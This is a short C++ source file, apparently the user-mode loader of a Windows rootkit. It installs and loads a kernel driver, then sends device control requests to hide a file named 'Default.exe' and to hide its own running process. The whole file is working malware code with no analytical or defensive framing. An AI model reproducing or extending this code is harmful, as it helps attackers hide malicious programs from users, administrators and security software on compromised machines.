// LdrK.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "LoadDrv.h"

int _tmain(int argc, _TCHAR* argv[])
{
	ULONG ulRetBytes;

	ulRetBytes = 0;

	if (InstallAndLdrDrv())
	{
		//if (CheckServiceIsRun(DRIVER_NAMEA))
		//{
		//}
	}
	if (NULL == g_hDevice)
	{
		g_hDevice = OpenDevice();
		if (g_hDevice)
		{
			IOP(RkHideFile) RkHideFile;
			RtlZeroMemory(&RkHideFile,sizeof(RkHideFile));
			memcpy(RkHideFile.FileNameW,L"Default.exe",wcslen(L"Default.exe") * sizeof(WCHAR));
			RkHideFile.bIsAddHide = TRUE;
			if (DeviceIoControl(g_hDevice,IOC(RkHideFile),&RkHideFile,sizeof(RkHideFile),NULL,0,&ulRetBytes,NULL))
			{
			}

			IOP(RkHideProcess) RkHideProcess;
			RtlZeroMemory(&RkHideProcess,sizeof(RkHideProcess));
			RkHideProcess.ulProcessId = GetCurrentProcessId();
			if (DeviceIoControl(g_hDevice,IOC(RkHideProcess),&RkHideProcess,sizeof(RkHideProcess),NULL,0,&ulRetBytes,NULL))
			{
			}
		}
	}
	system("pause");
	return 0;
}